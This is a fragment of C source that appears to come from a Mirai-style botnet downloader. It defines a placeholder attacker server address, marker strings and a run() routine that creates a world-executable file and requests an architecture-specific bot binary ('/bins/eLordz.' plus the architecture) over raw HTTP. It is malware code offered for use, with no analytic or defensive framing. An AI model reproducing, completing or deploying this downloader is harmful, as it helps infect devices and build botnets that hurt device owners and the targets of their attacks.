...
#define HTTP_SERVER utils_inet_addr(IPHERE) //replace the . with , dood

#define EXEC_MSG            "NYA\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "nya\n"
...
inline void run(void)
{
    ...
    ffd = open("nya", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bins/eLordz." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (17 + arch_strlen + 13))
    {
#ifdef DEBUG
